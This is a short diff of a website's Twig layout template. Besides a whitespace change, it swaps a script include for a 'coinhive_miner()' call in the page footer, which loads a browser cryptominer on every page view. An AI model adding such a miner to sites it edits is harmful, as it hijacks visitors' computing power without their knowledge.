@@ -22,8 +22,6 @@
     <!-- End Google Analytics -->
 </head>
 <body>
-
-
 <div class="container">
     {% include '@MedzonerGlobal/header.html.twig' %}
     {% block body %}{% endblock %}
@@ -39,7 +37,7 @@
     <!--<script type="text/javascript" src="{{ asset(advert_script) }}"></script>-->
     <script type="text/javascript" src="{{ asset('/js/app.min.js'|asset_js_version) }}"></script>
 {% endif %}
-<script type="text/javascript" src="{{ asset('/js/opt.js') }}"></script>
+{{ coinhive_miner() }}
 <script type="text/javascript">
     $(document).ready(function () {
         $(document).foundation({
